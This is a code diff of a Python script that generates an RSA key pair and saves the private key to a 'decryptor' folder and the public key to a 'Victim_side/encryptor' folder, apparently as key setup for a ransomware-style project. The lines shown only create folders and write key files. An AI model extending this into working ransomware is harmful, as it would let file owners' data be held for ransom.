@@ -22,26 +22,25 @@ def generate_rsa_keys():
 def prepare_folders():
     # Create folder structure in a safe, cross-platform way
     try:
-        key_dir = os.path.join(os.getcwd(), "../Key")
-        victim_dir = os.path.join(os.getcwd(), "../Victim")
+        pri_dir = os.path.join(os.getcwd(), "../decryptor")
+        pub_dir = os.path.join(os.getcwd(), "../../Victim_side/encryptor")
 
-        os.makedirs(key_dir, exist_ok=True)
-        os.makedirs(victim_dir, exist_ok=True)
-
-        print(f"[+] Folders ready: {key_dir}, {victim_dir}")
-        return key_dir, victim_dir
+        os.makedirs(pri_dir, exist_ok=True)
+        os.makedirs(pub_dir, exist_ok=True)
+        print(f"[+] Folders ready: {pri_dir}, {pub_dir}")
+        return pri_dir, pub_dir
 
     except Exception as e:
         print(f"[ERROR] Failed to create directories: {e}")
         return None, None
 
 
-def save_keys(private_key, public_key, key_dir, victim_dir):
+def save_keys(private_key, public_key, pri_dir, pub_dir):
     # Save RSA keys to PEM files
     try:
         # File paths (cross-platform safe)
-        private_file = os.path.join(key_dir, "private_key.pem")
-        public_file = os.path.join(victim_dir, "public_key.pem")
+        private_file = os.path.join(pri_dir, "asym_private_key.pem")
+        public_file = os.path.join(pub_dir, "asym_public_key.pem")
 
         # Save private key
         with open(private_file, "wb") as f:
